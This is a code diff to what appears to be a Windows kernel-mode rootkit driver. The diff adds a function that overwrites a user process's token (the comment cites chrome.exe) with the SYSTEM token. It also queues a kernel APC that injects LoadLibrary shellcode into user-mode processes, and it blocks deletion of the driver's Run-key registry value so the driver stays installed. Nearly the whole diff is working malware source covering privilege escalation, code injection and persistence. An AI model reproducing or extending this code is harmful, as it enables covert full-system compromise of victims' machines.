@@ -11,6 +11,7 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
 void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize);
 bool FindProcessByName(CHAR* Name, PEPROCESS* Process);
 bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
+void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token);
 
 extern "C" NTSTATUS
 DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
@@ -141,29 +142,23 @@ NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 }
 
 NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
-	REG_DELETE_KEY_INFORMATION* deleteKeyInfo;
 	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo;
 	PCUNICODE_STRING name;
 
 	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1) {
-	case RegNtPreDeleteKey:
-		deleteKeyInfo = (REG_DELETE_KEY_INFORMATION*)Argument2;
-		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteKeyInfo->Object, nullptr, &name, 0))) {
-
-			// filter out none-subzero deletions
-			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
-				KdPrint((DRIVER_PREFIX "[+] Registry key deletion attempt detected\n"));
-				return STATUS_ACCESS_DENIED;
-			}
-		}
 	case RegNtPreDeleteValueKey:
-		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;
-		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
 
-			// filter out none-subzero deletions
-			if (::wcsncmp(name->Buffer, REG_MACHINE REG_SZ_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_SZ_KEY_PATH) - 1) == 0) {
-				KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
-				return STATUS_ACCESS_DENIED;
+		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;			
+		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
+			
+			// filter out key deletions
+			if (::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1) == 0) {
+
+				// filter out value deletions
+				if (::wcsncmp(deleteValueInfo->ValueName->Buffer, DRIVER_NAMEW, ARRAYSIZE(DRIVER_NAMEW) - 1) == 0) {
+					KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
+					return STATUS_ACCESS_DENIED;
+				}			
 			}
 		}
 	}
@@ -231,13 +226,25 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 
-			// Thread and Process creation notification callbacks are not needed anymore - The APC will unregister them
-			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
-																		::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
-																		InjectUsermodeShellcodeAPC(LoadLibraryShellcode, sizeof(LoadLibraryShellcode)); }))
-				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
-
 			
+			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) 
+				{
+					PEPROCESS Process;
+					PACCESS_TOKEN Token;
+				
+					Process = PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
+					Token = ::PsReferencePrimaryToken(Process); // Get the process token
+					ReplaceToken(Process, Token);				// Replace the process token with system token
+					::ObDereferenceObject(Token);				// Dereference the process token
+					
+					// Thread and Process creation notification callbacks are not needed anymore
+					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
+					::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
+
+					// Now inject the shellcode
+					InjectUsermodeShellcodeAPC(LoadLibraryShellcode, sizeof(LoadLibraryShellcode));
+			}))
+				::ExReleaseRundownProtection(&g_Globals.RundownProtection);			
 		}
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
@@ -425,4 +432,25 @@ void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) 
 
 	// Kernel APC finished - release RP
 	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
+}
+
+void ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token)
+{
+	PACCESS_TOKEN SystemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
+	PULONG_PTR ptr = (PULONG_PTR)Process;
+
+	// Find the Token member in the EPROCESS structure
+	for (ULONG i = 0; i < 512; i++)
+	{
+		if ((ptr[i] & ~7) == (ULONG_PTR)((ULONG_PTR)Token & ~7))
+		{
+			// Replace the original token with system token
+			ptr[i] = (ULONG_PTR)SystemToken;
+			break;
+		}
+	}
+	// Dereference the system token
+	::ObDereferenceObject(SystemToken);
+
+	KdPrint((DRIVER_PREFIX "[+] Process token has changed successfully\n"));
 }
